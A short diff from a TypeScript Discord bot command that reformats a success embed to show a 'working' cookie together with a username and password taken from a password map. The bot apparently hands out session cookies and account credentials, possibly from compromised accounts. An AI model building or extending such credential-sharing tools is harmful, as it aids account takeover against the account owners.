@@ -135,8 +135,9 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
       const password = passwordMap.get(username.toLowerCase()) || 'N/A';
 
-      const embed = buildSuccessEmbed(`\`\`\`\n${workingCookie}\n\`\`\``);
-      embed.setDescription(`**Username:** ${username}\n**Password:** ${password}`);
+      const embed = buildSuccessEmbed(
+        `\`\`\`\n${workingCookie}\n\`\`\`\n**Username:** ${username}\n**Password:** ${password}`
+      );
       if (thumb) embed.setThumbnail(thumb);
 
       try {
